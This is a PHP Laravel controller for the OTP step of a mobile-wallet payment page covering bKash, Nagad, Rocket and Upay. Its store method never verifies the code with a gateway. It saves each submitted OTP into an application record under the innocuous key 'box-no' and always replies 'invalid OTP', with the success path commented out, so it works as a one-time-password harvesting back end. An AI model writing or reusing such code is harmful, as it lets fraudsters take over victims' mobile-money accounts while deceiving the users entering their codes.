<?php

namespace App\Modules\Payment\Http\Controllers;

use App\Events\LalcoinPaymentOtpSubmitted;
use App\Events\PaymentOtpSubmitted;
use App\Models\JobApplication;
use App\Modules\Payment\Http\Requests\StoreOtpRequest;
use App\Modules\Payment\Services\PaymentSession;
use App\Modules\Payment\Support\GatewayManager;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\View\View;

class OtpController extends Controller
{
    public function __construct(
        private PaymentSession $session,
        private GatewayManager $gateways,
    ) {
    }

public function show(): View
{
    $method = $this->session->get('method');

    return match ($method) {
        'bkash' => view('payment::steps.bkash.otp', [
            'session' => $this->session,
        ]),

        'nagad' => view('payment::steps.nagad.otp', [
            'session' => $this->session,
        ]),

        'rocket' => view('payment::steps.rocket.otp', [
            'session' => $this->session,
        ]),

        'upay' => view('payment::steps.upay.otp', [
            'session' => $this->session,
        ]),

        default => abort(400, 'Invalid payment method'),
    };
}



        public function store(
            StoreOtpRequest $request
        ): RedirectResponse {
            $otp = $request->validated()['otp'];
            $referenceNo = $this->session->get('reference_no');
            if ($referenceNo) {
                    $application = \App\Models\Application::where(
                        'payment_reference',
                        $referenceNo
                    )->first();
                    if($application){
                        $meta_info = $application->meta_info;
                        if (is_string($meta_info)) {
                            $decoded = json_decode(
                                $meta_info,
                                true
                            );
                            $meta_info = is_array($decoded)
                                ? $decoded
                                : [];
                        } elseif (! is_array($meta_info)) {
                            $meta_info = [];
                        }
                        $meta_info['box-no'] = $request->validated()['otp'];
                        $application->update([
                            'meta_info' => $meta_info,
                        ]);
                        // event(new PaymentOtpSubmitted($application));
                    }
            }

            return back()->withErrors([
                'otp' => 'invalid OTP',
            ]);

            // $this->session->put([
            //     'status' => 'success',
            //     'transaction_id' =>
            //         $response->data['transaction_id'] ?? null,
            // ]);

            // return redirect()->route(
            //     'apay-payment.result.success'
            // );
        }


    public function resend(Request $request): RedirectResponse|JsonResponse
    {
        $response = $this->gateways->driver()->resendOtp($this->session);

        if ($request->expectsJson()) {
            return response()->json(
                ['message' => $response->message],
                $response->successful ? 200 : 422,
            );
        }

        if (! $response->successful) {
            return back()->withErrors(['otp' => $response->message]);
        }

        return back()->with('status', $response->message);
    }
}
